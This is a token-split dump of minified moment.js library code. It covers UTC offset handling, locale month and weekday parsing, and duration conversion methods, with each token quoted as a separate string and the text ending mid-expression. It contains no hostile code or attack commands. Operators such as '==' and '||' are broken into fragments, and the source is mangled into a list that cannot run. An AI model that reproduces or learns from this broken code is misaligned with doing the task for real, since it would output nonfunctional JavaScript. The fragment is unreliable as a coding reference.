"hour", "=", "Sn", ".", "hours", "=", "Bt", ",", "Sn", ".", "minute", "=", "Sn", ".", "minutes", "=", "wn", ",", "Sn", ".", "second", "=", "Sn", ".", "seconds", "=", "vn", ",", "Sn", ".", "millisecond", "=", "Sn", ".", "milliseconds", "=", "kn", ",", "Sn", ".", "utcOffset", "=", "function", "(", "t", ",", "n", ",", "s", ")", "{", "var", "i", ",", "r", "=", "this", ".", "_offset", "|", "|", "0", ";", "if", "(", "!", "this", ".", "isValid", "(", "))", "return", "null", "!", "=", "t", "?", "this", ":", "NaN", ";", "if", "(", "null", "!", "=", "t", ")", "{", "if", "(", "\"", "string", "\"", "==", "typeof", "t", ")", "{", "if", "(", "null", "=", "==", "(", "t", "=", "De", "(", "St", ",", "t", ")", "))", "return", "this", "}", "else", "Math", ".", "abs", "(", "t", ")", "<", "16", "&", "&!", "s", "&", "&(", "t", "*", "=", "60", ")", ";", "return", "!", "this", ".", "_isUTC", "&", "&", "n", "&", "&(", "i", "=", "Oe", "(", "this", ")", "),", "this", ".", "_offset", "=", "t", ",", "this", ".", "_isUTC", "=", "!", "0", ",", "null", "!", "=", "i", "&", "&", "this", ".", "add", "(", "i", ",", "\"", "m", "\"", "),", "r", "!", "==", "t", "&", "&(", "!", "n", "|", "|", "this", ".", "_changeInProgress", "?", "Re", "(", "this", ",", "Te", "(", "t", "-", "r", ",", "\"", "m", "\"", "),", "1", ",", "!", "1", ")", ":", "this", ".", "_changeInProgress", "|", "|(", "this", ".", "_changeInProgress", "=", "!", "0", ",", "e", ".", "updateOffset", "(", "this", ",", "!", "0", ")", ",", "this", ".", "_changeInProgress", "=", "null", ")", "),", "this", "}", "return", "this", ".", "_isUTC", "?", "r", ":", "Oe", "(", "this", ")", "},", "Sn", ".", "utc", "=", "function", "(", "e", ")", "{", "return", "this", ".", "utcOffset", "(", "0", ",", "e", ")", "},", "Sn", ".", "local", "=", "function", "(", "e", ")", "{", "return", "this", ".", "_isUTC", "&", "&(", "this", ".", "utcOffset", "(", "0", ",", "e", ")", ",", "this", ".", "_isUTC", "=", "!", "1", ",", "e", "&", "&", "this", ".", "subtract", "(", "Oe", "(", "this", ")", ",\"", "m", "\"", "))", ",", "this", "}", ",", "Sn", ".", "parseZone", "=", "function", "(", "){", "if", "(", "null", "!", "=", "this", ".", "_tzm", ")", "this", ".", "utcOffset", "(", "this", ".", "_tzm", ",", "!", "1", ",", "!", "0", ")", ";", "else", "if", "(", "\"", "string", "\"", "==", "typeof", "this", ".", "_i", ")", "{", "var", "e", "=", "De", "(", "kt", ",", "this", ".", "_i", ")", ";", "null", "!", "=", "e", "?", "this", ".", "utcOffset", "(", "e", ")", ":", "this", ".", "utcOffset", "(", "0", ",", "!", "0", ")", "}", "return", "this", "}", ",", "Sn", ".", "hasAlignedHourOffset", "=", "function", "(", "e", ")", "{", "return", "!", "!", "this", ".", "isValid", "(", ")&", "&(", "e", "=", "e", "?", "pe", "(", "e", ")", ".", "utcOffset", "(", "):", "0", ",", "(", "this", ".", "utcOffset", "(", ")-", "e", ")", "%", "60", "=", "=", "0", ")", "},", "Sn", ".", "isDST", "=", "function", "(", "){", "return", "this", ".", "utcOffset", "(", ")>", "this", ".", "clone", "(", ").", "month", "(", "0", ")", ".", "utcOffset", "(", ")|", "|", "this", ".", "utcOffset", "(", ")>", "this", ".", "clone", "(", ").", "month", "(", "5", ")", ".", "utcOffset", "(", ")}", ",", "Sn", ".", "isLocal", "=", "function", "(", "){", "return", "!", "!", "this", ".", "isValid", "(", ")&", "&!", "this", ".", "_isUTC", "}", ",", "Sn", ".", "isUtcOffset", "=", "function", "(", "){", "return", "!", "!", "this", ".", "isValid", "(", ")&", "&", "this", ".", "_isUTC", "}", ",", "Sn", ".", "isUtc", "=", "xe", ",", "Sn", ".", "isUTC", "=", "xe", ",", "Sn", ".", "zoneAbbr", "=", "function", "(", "){", "return", "this", ".", "_isUTC", "?", "\"", "UTC", "\"", ":\"", "\"}", ",", "Sn", ".", "zoneName", "=", "function", "(", "){", "return", "this", ".", "_isUTC", "?", "\"", "Coordinated", "Universal", "Time", "\"", ":\"", "\"}", ",", "Sn", ".", "dates", "=", "v", "(", "\"", "dates", "accessor", "is", "deprecated", ".", "Use", "date", "instead", ".", "\",", "pn", ")", ",", "Sn", ".", "months", "=", "v", "(", "\"", "months", "accessor", "is", "deprecated", ".", "Use", "month", "instead", "\"", ",$", "),", "Sn", ".", "years", "=", "v", "(", "\"", "years", "accessor", "is", "deprecated", ".", "Use", "year", "instead", "\"", ",", "Ht", ")", ",", "Sn", ".", "zone", "=", "v", "(", "\"", "moment", "(", ").", "zone", "is", "deprecated", ",", "use", "moment", "(", ").", "utcOffset", "instead", ".", "http", ":", "//", "momentjs", ".", "com", "/", "guides", "/", "#/", "warnings", "/", "zone", "/", "\",", "function", "(", "e", ",", "t", ")", "{", "return", "null", "!", "=", "e", "?", "(\"", "string", "\"", "!=", "typeof", "e", "&", "&(", "e", "=", "-", "e", ")", ",", "this", ".", "utcOffset", "(", "e", ",", "t", ")", ",", "this", ")", ":-", "this", ".", "utcOffset", "(", ")}", "),", "Sn", ".", "isDSTShifted", "=", "v", "(", "\"", "isDSTShifted", "is", "deprecated", ".", "See", "http", ":", "//", "momentjs", ".", "com", "/", "guides", "/", "#/", "warnings", "/", "dst", "-", "shifted", "/", "for", "more", "information", "\"", ",", "function", "(", "){", "if", "(", "!", "s", "(", "this", ".", "_isDSTShifted", ")", ")", "return", "this", ".", "_isDSTShifted", ";", "var", "e", "=", "{}", ";", "if", "(", "f", "(", "e", ",", "this", ")", ",(", "e", "=", "ye", "(", "e", ")", ").", "_a", ")", "{", "var", "t", "=", "e", ".", "_isUTC", "?", "l", "(", "e", ".", "_a", ")", ":", "pe", "(", "e", ".", "_a", ")", ";", "this", ".", "_isDSTShifted", "=", "this", ".", "isValid", "(", ")&", "&", "p", "(", "e", ".", "_a", ",", "t", ".", "toArray", "(", "))", ">", "0", "}", "else", "this", ".", "_isDSTShifted", "=", "!", "1", ";", "return", "this", ".", "_isDSTShifted", "}", ");", "var", "Dn", "=", "D", ".", "prototype", ";", "Dn", ".", "calendar", "=", "function", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", "=", "this", ".", "_calendar", "[", "e", "]", "||", "this", ".", "_calendar", ".", "sameElse", ";", "return", "k", "(", "s", ")", "?", "s", ".", "call", "(", "t", ",", "n", ")", ":", "s", "}", ",", "Dn", ".", "longDateFormat", "=", "function", "(", "e", ")", "{", "var", "t", "=", "this", ".", "_longDateFormat", "[", "e", "]", ",", "n", "=", "this", ".", "_longDateFormat", "[", "e", ".", "toUpperCase", "(", ")]", ";", "return", "t", "|", "|!", "n", "?", "t", ":", "(", "this", ".", "_longDateFormat", "[", "e", "]", "=", "n", ".", "replace", "(", "/", "MMMM", "|", "MM", "|", "DD", "|", "dddd", "/", "g", ",", "function", "(", "e", ")", "{", "return", "e", ".", "slice", "(", "1", ")", "})", ",", "this", ".", "_longDateFormat", "[", "e", "]", ")}", ",", "Dn", ".", "invalidDate", "=", "function", "(", "){", "return", "this", ".", "_invalidDate", "}", ",", "Dn", ".", "ordinal", "=", "function", "(", "e", ")", "{", "return", "this", ".", "_ordinal", ".", "replace", "(", "\"%", "d", "\"", ",", "e", ")", "},", "Dn", ".", "preparse", "=", "Ge", ",", "Dn", ".", "postformat", "=", "Ge", ",", "Dn", ".", "relativeTime", "=", "function", "(", "e", ",", "t", ",", "n", ",", "s", ")", "{", "var", "i", "=", "this", ".", "_relativeTime", "[", "n", "]", ";", "return", "k", "(", "i", ")", "?", "i", "(", "e", ",", "t", ",", "n", ",", "s", ")", ":", "i", ".", "replace", "(", "/%", "d", "/", "i", ",", "e", ")", "},", "Dn", ".", "pastFuture", "=", "function", "(", "e", ",", "t", ")", "{", "var", "n", "=", "this", ".", "_relativeTime", "[", "e", ">", "0", "?", "\"", "future", "\"", ":\"", "past", "\"", "];", "return", "k", "(", "n", ")", "?", "n", "(", "t", ")", ":", "n", ".", "replace", "(", "/%", "s", "/", "i", ",", "t", ")", "},", "Dn", ".", "set", "=", "function", "(", "e", ")", "{", "var", "t", ",", "n", ";", "for", "(", "n", "in", "e", ")", "k", "(", "t", "=", "e", "[", "n", "]", ")?", "this", "[", "n", "]", "=", "t", ":", "this", "[", "\"", "_", "\"", "+", "n", "]", "=", "t", ";", "this", ".", "_config", "=", "e", ",", "this", ".", "_dayOfMonthOrdinalParseLenient", "=", "new", "RegExp", "(", "(", "this", ".", "_dayOfMonthOrdinalParse", ".", "source", "|", "|", "this", ".", "_ordinalParse", ".", "source", ")", "+\"", "|\"", "+/", "\\", "d", "{", "1", ",", "2", "}", "/.", "source", ")", "},", "Dn", ".", "months", "=", "function", "(", "e", ",", "n", ")", "{", "return", "e", "?", "t", "(", "this", ".", "_months", ")", "?", "this", ".", "_months", "[", "e", ".", "month", "(", ")]", ":", "this", ".", "_months", "[", "(", "this", ".", "_months", ".", "isFormat", "|", "|", "Lt", ")", ".", "test", "(", "n", ")", "?\"", "format", "\"", ":\"", "standalone", "\"", "][", "e", ".", "month", "(", ")]", ":", "t", "(", "this", ".", "_months", ")", "?", "this", ".", "_months", ":", "this", ".", "_months", ".", "standalone", "}", ",", "Dn", ".", "monthsShort", "=", "function", "(", "e", ",", "n", ")", "{", "return", "e", "?", "t", "(", "this", ".", "_monthsShort", ")", "?", "this", ".", "_monthsShort", "[", "e", ".", "month", "(", ")]", ":", "this", ".", "_monthsShort", "[", "Lt", ".", "test", "(", "n", ")", "?\"", "format", "\"", ":\"", "standalone", "\"", "][", "e", ".", "month", "(", ")]", ":", "t", "(", "this", ".", "_monthsShort", ")", "?", "this", ".", "_monthsShort", ":", "this", ".", "_monthsShort", ".", "standalone", "}", ",", "Dn", ".", "monthsParse", "=", "function", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", ",", "i", ",", "r", ";", "if", "(", "this", ".", "_monthsParseExact", ")", "return", "function", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", ",", "i", ",", "r", ",", "a", "=", "e", ".", "toLocaleLowerCase", "(", ");", "if", "(", "!", "this", ".", "_monthsParse", ")", "for", "(", "this", ".", "_monthsParse", "=", "[]", ",", "this", ".", "_longMonthsParse", "=", "[]", ",", "this", ".", "_shortMonthsParse", "=", "[]", ",", "s", "=", "0", ";", "s", "<", "12", ";", "++", "s", ")", "r", "=", "l", "(", "[", "2e3", ",", "s", "]", "),", "this", ".", "_shortMonthsParse", "[", "s", "]", "=", "this", ".", "monthsShort", "(", "r", ",", "\"\"", ").", "toLocaleLowerCase", "(", "),", "this", ".", "_longMonthsParse", "[", "s", "]", "=", "this", ".", "months", "(", "r", ",", "\"\"", ").", "toLocaleLowerCase", "(", ");", "return", "n", "?", "\"", "MMM", "\"", "==", "=", "t", "?", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_shortMonthsParse", ",", "a", ")", ")?", "i", ":", "null", ":", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_longMonthsParse", ",", "a", ")", ")?", "i", ":", "null", ":", "\"", "MMM", "\"", "==", "=", "t", "?", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_shortMonthsParse", ",", "a", ")", ")?", "i", ":", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_longMonthsParse", ",", "a", ")", ")?", "i", ":", "null", ":", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_longMonthsParse", ",", "a", ")", ")?", "i", ":", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_shortMonthsParse", ",", "a", ")", ")?", "i", ":", "null", "}", ".", "call", "(", "this", ",", "e", ",", "t", ",", "n", ")", ";", "for", "(", "this", ".", "_monthsParse", "|", "|(", "this", ".", "_monthsParse", "=", "[]", ",", "this", ".", "_longMonthsParse", "=", "[]", ",", "this", ".", "_shortMonthsParse", "=", "[]", "),", "s", "=", "0", ";", "s", "<", "12", ";", "s", "+", "+)", "{", "if", "(", "i", "=", "l", "(", "[", "2e3", ",", "s", "]", "),", "n", "&", "&!", "this", ".", "_longMonthsParse", "[", "s", "]", "&&", "(", "this", ".", "_longMonthsParse", "[", "s", "]", "=", "new", "RegExp", "(", "\"^", "\"+", "this", ".", "months", "(", "i", ",", "\"\"", ").", "replace", "(", "\".", "\",", "\"\"", ")+", "\"$", "\",", "\"", "i", "\"", "),", "this", ".", "_shortMonthsParse", "[", "s", "]", "=", "new", "RegExp", "(", "\"^", "\"+", "this", ".", "monthsShort", "(", "i", ",", "\"\"", ").", "replace", "(", "\".", "\",", "\"\"", ")+", "\"$", "\",", "\"", "i", "\"", "))", ",", "n", "|", "|", "this", ".", "_monthsParse", "[", "s", "]", "||", "(", "r", "=", "\"^", "\"+", "this", ".", "months", "(", "i", ",", "\"\"", ")+", "\"|", "^\"", "+", "this", ".", "monthsShort", "(", "i", ",", "\"\"", "),", "this", ".", "_monthsParse", "[", "s", "]", "=", "new", "RegExp", "(", "r", ".", "replace", "(", "\".", "\",", "\"\"", "),", "\"", "i", "\"", "))", ",", "n", "&", "&\"", "MMMM", "\"", "==", "=", "t", "&", "&", "this", ".", "_longMonthsParse", "[", "s", "]", ".", "test", "(", "e", ")", ")", "return", "s", ";", "if", "(", "n", "&", "&\"", "MMM", "\"", "==", "=", "t", "&", "&", "this", ".", "_shortMonthsParse", "[", "s", "]", ".", "test", "(", "e", ")", ")", "return", "s", ";", "if", "(", "!", "n", "&", "&", "this", ".", "_monthsParse", "[", "s", "]", ".", "test", "(", "e", ")", ")", "return", "s", "}", "},", "Dn", ".", "monthsRegex", "=", "function", "(", "e", ")", "{", "return", "this", ".", "_monthsParseExact", "?", "(", "o", "(", "this", ",", "\"", "_monthsRegex", "\"", ")|", "|", "q", ".", "call", "(", "this", ")", ",", "e", "?", "this", ".", "_monthsStrictRegex", ":", "this", ".", "_monthsRegex", ")", ":(", "o", "(", "this", ",", "\"", "_monthsRegex", "\"", ")|", "|(", "this", ".", "_monthsRegex", "=", "It", ")", ",", "this", ".", "_monthsStrictRegex", "&", "&", "e", "?", "this", ".", "_monthsStrictRegex", ":", "this", ".", "_monthsRegex", ")", "},", "Dn", ".", "monthsShortRegex", "=", "function", "(", "e", ")", "{", "return", "this", ".", "_monthsParseExact", "?", "(", "o", "(", "this", ",", "\"", "_monthsRegex", "\"", ")|", "|", "q", ".", "call", "(", "this", ")", ",", "e", "?", "this", ".", "_monthsShortStrictRegex", ":", "this", ".", "_monthsShortRegex", ")", ":(", "o", "(", "this", ",", "\"", "_monthsShortRegex", "\"", ")|", "|(", "this", ".", "_monthsShortRegex", "=", "jt", ")", ",", "this", ".", "_monthsShortStrictRegex", "&", "&", "e", "?", "this", ".", "_monthsShortStrictRegex", ":", "this", ".", "_monthsShortRegex", ")", "},", "Dn", ".", "week", "=", "function", "(", "e", ")", "{", "return", "X", "(", "e", ",", "this", ".", "_week", ".", "dow", ",", "this", ".", "_week", ".", "doy", ")", ".", "week", "}", ",", "Dn", ".", "firstDayOfYear", "=", "function", "(", "){", "return", "this", ".", "_week", ".", "doy", "}", ",", "Dn", ".", "firstDayOfWeek", "=", "function", "(", "){", "return", "this", ".", "_week", ".", "dow", "}", ",", "Dn", ".", "weekdays", "=", "function", "(", "e", ",", "n", ")", "{", "return", "e", "?", "t", "(", "this", ".", "_weekdays", ")", "?", "this", ".", "_weekdays", "[", "e", ".", "day", "(", ")]", ":", "this", ".", "_weekdays", "[", "this", ".", "_weekdays", ".", "isFormat", ".", "test", "(", "n", ")", "?\"", "format", "\"", ":\"", "standalone", "\"", "][", "e", ".", "day", "(", ")]", ":", "t", "(", "this", ".", "_weekdays", ")", "?", "this", ".", "_weekdays", ":", "this", ".", "_weekdays", ".", "standalone", "}", ",", "Dn", ".", "weekdaysMin", "=", "function", "(", "e", ")", "{", "return", "e", "?", "this", ".", "_weekdaysMin", "[", "e", ".", "day", "(", ")]", ":", "this", ".", "_weekdaysMin", "}", ",", "Dn", ".", "weekdaysShort", "=", "function", "(", "e", ")", "{", "return", "e", "?", "this", ".", "_weekdaysShort", "[", "e", ".", "day", "(", ")]", ":", "this", ".", "_weekdaysShort", "}", ",", "Dn", ".", "weekdaysParse", "=", "function", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", ",", "i", ",", "r", ";", "if", "(", "this", ".", "_weekdaysParseExact", ")", "return", "function", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", ",", "i", ",", "r", ",", "a", "=", "e", ".", "toLocaleLowerCase", "(", ");", "if", "(", "!", "this", ".", "_weekdaysParse", ")", "for", "(", "this", ".", "_weekdaysParse", "=", "[]", ",", "this", ".", "_shortWeekdaysParse", "=", "[]", ",", "this", ".", "_minWeekdaysParse", "=", "[]", ",", "s", "=", "0", ";", "s", "<", "7", ";", "++", "s", ")", "r", "=", "l", "(", "[", "2e3", ",", "1", "]", ").", "day", "(", "s", ")", ",", "this", ".", "_minWeekdaysParse", "[", "s", "]", "=", "this", ".", "weekdaysMin", "(", "r", ",", "\"\"", ").", "toLocaleLowerCase", "(", "),", "this", ".", "_shortWeekdaysParse", "[", "s", "]", "=", "this", ".", "weekdaysShort", "(", "r", ",", "\"\"", ").", "toLocaleLowerCase", "(", "),", "this", ".", "_weekdaysParse", "[", "s", "]", "=", "this", ".", "weekdays", "(", "r", ",", "\"\"", ").", "toLocaleLowerCase", "(", ");", "return", "n", "?", "\"", "dddd", "\"", "==", "=", "t", "?", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_weekdaysParse", ",", "a", ")", ")?", "i", ":", "null", ":", "\"", "ddd", "\"", "==", "=", "t", "?", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_shortWeekdaysParse", ",", "a", ")", ")?", "i", ":", "null", ":", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_minWeekdaysParse", ",", "a", ")", ")?", "i", ":", "null", ":", "\"", "dddd", "\"", "==", "=", "t", "?", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_weekdaysParse", ",", "a", ")", ")?", "i", ":", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_shortWeekdaysParse", ",", "a", ")", ")?", "i", ":", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_minWeekdaysParse", ",", "a", ")", ")?", "i", ":", "null", ":", "\"", "ddd", "\"", "==", "=", "t", "?", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_shortWeekdaysParse", ",", "a", ")", ")?", "i", ":", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_weekdaysParse", ",", "a", ")", ")?", "i", ":", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_minWeekdaysParse", ",", "a", ")", ")?", "i", ":", "null", ":", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_minWeekdaysParse", ",", "a", ")", ")?", "i", ":", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_weekdaysParse", ",", "a", ")", ")?", "i", ":", "-", "1", "!", "==", "(", "i", "=", "Nt", ".", "call", "(", "this", ".", "_shortWeekdaysParse", ",", "a", ")", ")?", "i", ":", "null", "}", ".", "call", "(", "this", ",", "e", ",", "t", ",", "n", ")", ";", "for", "(", "this", ".", "_weekdaysParse", "|", "|(", "this", ".", "_weekdaysParse", "=", "[]", ",", "this", ".", "_minWeekdaysParse", "=", "[]", ",", "this", ".", "_shortWeekdaysParse", "=", "[]", ",", "this", ".", "_fullWeekdaysParse", "=", "[]", "),", "s", "=", "0", ";", "s", "<", "7", ";", "s", "+", "+)", "{", "if", "(", "i", "=", "l", "(", "[", "2e3", ",", "1", "]", ").", "day", "(", "s", ")", ",", "n", "&", "&!", "this", ".", "_fullWeekdaysParse", "[", "s", "]", "&&", "(", "this", ".", "_fullWeekdaysParse", "[", "s", "]", "=", "new", "RegExp", "(", "\"^", "\"+", "this", ".", "weekdays", "(", "i", ",", "\"\"", ").", "replace", "(", "\".", "\",", "\".", "?\"", ")+", "\"$", "\",", "\"", "i", "\"", "),", "this", ".", "_shortWeekdaysParse", "[", "s", "]", "=", "new", "RegExp", "(", "\"^", "\"+", "this", ".", "weekdaysShort", "(", "i", ",", "\"\"", ").", "replace", "(", "\".", "\",", "\".", "?\"", ")+", "\"$", "\",", "\"", "i", "\"", "),", "this", ".", "_minWeekdaysParse", "[", "s", "]", "=", "new", "RegExp", "(", "\"^", "\"+", "this", ".", "weekdaysMin", "(", "i", ",", "\"\"", ").", "replace", "(", "\".", "\",", "\".", "?\"", ")+", "\"$", "\",", "\"", "i", "\"", "))", ",", "this", ".", "_weekdaysParse", "[", "s", "]", "||", "(", "r", "=", "\"^", "\"+", "this", ".", "weekdays", "(", "i", ",", "\"\"", ")+", "\"|", "^\"", "+", "this", ".", "weekdaysShort", "(", "i", ",", "\"\"", ")+", "\"|", "^\"", "+", "this", ".", "weekdaysMin", "(", "i", ",", "\"\"", "),", "this", ".", "_weekdaysParse", "[", "s", "]", "=", "new", "RegExp", "(", "r", ".", "replace", "(", "\".", "\",", "\"\"", "),", "\"", "i", "\"", "))", ",", "n", "&", "&\"", "dddd", "\"", "==", "=", "t", "&", "&", "this", ".", "_fullWeekdaysParse", "[", "s", "]", ".", "test", "(", "e", ")", ")", "return", "s", ";", "if", "(", "n", "&", "&\"", "ddd", "\"", "==", "=", "t", "&", "&", "this", ".", "_shortWeekdaysParse", "[", "s", "]", ".", "test", "(", "e", ")", ")", "return", "s", ";", "if", "(", "n", "&", "&\"", "dd", "\"", "==", "=", "t", "&", "&", "this", ".", "_minWeekdaysParse", "[", "s", "]", ".", "test", "(", "e", ")", ")", "return", "s", ";", "if", "(", "!", "n", "&", "&", "this", ".", "_weekdaysParse", "[", "s", "]", ".", "test", "(", "e", ")", ")", "return", "s", "}", "},", "Dn", ".", "weekdaysRegex", "=", "function", "(", "e", ")", "{", "return", "this", ".", "_weekdaysParseExact", "?", "(", "o", "(", "this", ",", "\"", "_weekdaysRegex", "\"", ")|", "|", "ee", ".", "call", "(", "this", ")", ",", "e", "?", "this", ".", "_weekdaysStrictRegex", ":", "this", ".", "_weekdaysRegex", ")", ":(", "o", "(", "this", ",", "\"", "_weekdaysRegex", "\"", ")|", "|(", "this", ".", "_weekdaysRegex", "=", "Zt", ")", ",", "this", ".", "_weekdaysStrictRegex", "&", "&", "e", "?", "this", ".", "_weekdaysStrictRegex", ":", "this", ".", "_weekdaysRegex", ")", "},", "Dn", ".", "weekdaysShortRegex", "=", "function", "(", "e", ")", "{", "return", "this", ".", "_weekdaysParseExact", "?", "(", "o", "(", "this", ",", "\"", "_weekdaysRegex", "\"", ")|", "|", "ee", ".", "call", "(", "this", ")", ",", "e", "?", "this", ".", "_weekdaysShortStrictRegex", ":", "this", ".", "_weekdaysShortRegex", ")", ":(", "o", "(", "this", ",", "\"", "_weekdaysShortRegex", "\"", ")|", "|(", "this", ".", "_weekdaysShortRegex", "=", "$", "t", ")", ",", "this", ".", "_weekdaysShortStrictRegex", "&", "&", "e", "?", "this", ".", "_weekdaysShortStrictRegex", ":", "this", ".", "_weekdaysShortRegex", ")", "},", "Dn", ".", "weekdaysMinRegex", "=", "function", "(", "e", ")", "{", "return", "this", ".", "_weekdaysParseExact", "?", "(", "o", "(", "this", ",", "\"", "_weekdaysRegex", "\"", ")|", "|", "ee", ".", "call", "(", "this", ")", ",", "e", "?", "this", ".", "_weekdaysMinStrictRegex", ":", "this", ".", "_weekdaysMinRegex", ")", ":(", "o", "(", "this", ",", "\"", "_weekdaysMinRegex", "\"", ")|", "|(", "this", ".", "_weekdaysMinRegex", "=", "qt", ")", ",", "this", ".", "_weekdaysMinStrictRegex", "&", "&", "e", "?", "this", ".", "_weekdaysMinStrictRegex", ":", "this", ".", "_weekdaysMinRegex", ")", "},", "Dn", ".", "isPM", "=", "function", "(", "e", ")", "{", "return", "\"", "p", "\"", "==", "=(", "e", "+", "\"\"", ").", "toLowerCase", "(", ").", "charAt", "(", "0", ")", "},", "Dn", ".", "meridiem", "=", "function", "(", "e", ",", "t", ",", "n", ")", "{", "return", "e", ">", "11", "?", "n", "?", "\"", "pm", "\"", ":\"", "PM", "\"", ":", "n", "?", "\"", "am", "\"", ":\"", "AM", "\"", "},", "ae", "(", "\"", "en", "\"", ",{", "dayOfMonthOrdinalParse", ":", "/\\", "d", "{", "1", ",", "2", "}", "(", "th", "|", "st", "|", "nd", "|", "rd", ")", "/,", "ordinal", ":", "function", "(", "e", ")", "{", "var", "t", "=", "e", "%", "10", ";", "return", "e", "+", "(", "1", "=", "==", "g", "(", "e", "%", "100", "/", "10", ")", "?\"", "th", "\"", ":", "1", "=", "==", "t", "?", "\"", "st", "\"", ":", "2", "=", "==", "t", "?", "\"", "nd", "\"", ":", "3", "=", "==", "t", "?", "\"", "rd", "\"", ":\"", "th", "\"", ")}", "})", ",", "e", ".", "lang", "=", "v", "(", "\"", "moment", ".", "lang", "is", "deprecated", ".", "Use", "moment", ".", "locale", "instead", ".", "\",", "ae", ")", ",", "e", ".", "langData", "=", "v", "(", "\"", "moment", ".", "langData", "is", "deprecated", ".", "Use", "moment", ".", "localeData", "instead", ".", "\",", "ue", ")", ";", "var", "Yn", "=", "Math", ".", "abs", ",", "On", "=", "$", "e", "(", "\"", "ms", "\"", "),", "xn", "=", "$", "e", "(", "\"", "s", "\"", "),", "Tn", "=", "$", "e", "(", "\"", "m", "\"", "),", "bn", "=", "$", "e", "(", "\"", "h", "\"", "),", "Pn", "=", "$", "e", "(", "\"", "d", "\"", "),", "Wn", "=", "$", "e", "(", "\"", "w", "\"", "),", "Rn", "=", "$", "e", "(", "\"", "M", "\"", "),", "Cn", "=", "$", "e", "(", "\"", "y", "\"", "),", "Fn", "=", "qe", "(", "\"", "milliseconds", "\"", "),", "Un", "=", "qe", "(", "\"", "seconds", "\"", "),", "Nn", "=", "qe", "(", "\"", "minutes", "\"", "),", "Hn", "=", "qe", "(", "\"", "hours", "\"", "),", "Ln", "=", "qe", "(", "\"", "days", "\"", "),", "Gn", "=", "qe", "(", "\"", "months", "\"", "),", "Vn", "=", "qe", "(", "\"", "years", "\"", "),", "jn", "=", "Math", ".", "round", ",", "In", "=", "{", "ss", ":", "44", ",", "s", ":", "45", ",", "m", ":", "45", ",", "h", ":", "22", ",", "d", ":", "26", ",", "M", ":", "11", "}", ",", "En", "=", "Math", ".", "abs", ",", "An", "=", "ve", ".", "prototype", ";", "return", "An", ".", "isValid", "=", "function", "(", "){", "return", "this", ".", "_isValid", "}", ",", "An", ".", "abs", "=", "function", "(", "){", "var", "e", "=", "this", ".", "_data", ";", "return", "this", ".", "_milliseconds", "=", "Yn", "(", "this", ".", "_milliseconds", ")", ",", "this", ".", "_days", "=", "Yn", "(", "this", ".", "_days", ")", ",", "this", ".", "_months", "=", "Yn", "(", "this", ".", "_months", ")", ",", "e", ".", "milliseconds", "=", "Yn", "(", "e", ".", "milliseconds", ")", ",", "e", ".", "seconds", "=", "Yn", "(", "e", ".", "seconds", ")", ",", "e", ".", "minutes", "=", "Yn", "(", "e", ".", "minutes", ")", ",", "e", ".", "hours", "=", "Yn", "(", "e", ".", "hours", ")", ",", "e", ".", "months", "=", "Yn", "(", "e", ".", "months", ")", ",", "e", ".", "years", "=", "Yn", "(", "e", ".", "years", ")", ",", "this", "}", ",", "An", ".", "add", "=", "function", "(", "e", ",", "t", ")", "{", "return", "Ee", "(", "this", ",", "e", ",", "t", ",", "1", ")", "},", "An", ".", "subtract", "=", "function", "(", "e", ",", "t", ")", "{", "return", "Ee", "(", "this", ",", "e", ",", "t", ",", "-", "1", ")", "},", "An", ".", "as", "=", "function", "(", "e", ")", "{", "if", "(", "!", "this", ".", "isValid", "(", "))", "return", "NaN", ";", "var", "t", ",", "n", ",", "s", "=", "this", ".", "_milliseconds", ";", "if", "(", "\"", "month", "\"", "==", "=(", "e", "=", "O", "(", "e", ")", ")|", "|\"", "year", "\"", "==", "=", "e", ")", "return", "t", "=", "this", ".", "_days", "+", "s", "/", "864e5", ",", "n", "=", "this", ".", "_months", "+", "ze", "(", "t", ")", ",\"", "month", "\"", "==", "=", "e", "?", "n", ":", "n", "/", "12", ";", "switch", "(", "t", "=", "this", ".", "_days", "+", "Math", ".", "round", "(", "Ze", "(", "this", ".", "_months", ")", "),", "e", ")", "{", "case", "\"", "week", "\"", ":", "return", "t", "/", "7", "+", "s", "/", "6048e5", ";", "case", "\"", "day", "\"", ":", "return", "t", "+", "s", "/", "864e5", ";", "case", "\"", "hour", "\"", ":", "return", "24", "*", "t", "+", "s", "/", "36e5", ";", "case", "\"", "minute", "\"", ":", "return", "1440", "*", "t", "+", "s", "/", "6e4", ";", "case", "\"", "second", "\"", ":", "return", "86400", "*", "t", "+", "s", "/", "1e3", ";", "case", "\"", "millisecond", "\"", ":", "return", "Math", ".", "floor", "(", "864e5", "*", "t", ")", "+", "s", ";", "default", ":", "throw", "new", "Error", "(", "\"", "Unknown", "unit", "\"", "+", "e", ")", "}}", ",", "An", ".", "asMilliseconds", "=", "On", ",", "An", ".", "asSeconds", "=", "xn", ",", "An", ".", "asMinutes", "=", "Tn", ",", "An", ".", "asHours", "=", "bn", ",", "An", ".", "asDays", "=", "Pn", ",", "An", ".", "asWeeks", "=", "Wn", ",", "An", ".", "asMonths", "=", "Rn", ",", "An", ".", "asYears", "=", "Cn", ",", "An", ".", "valueOf", "=", "function", 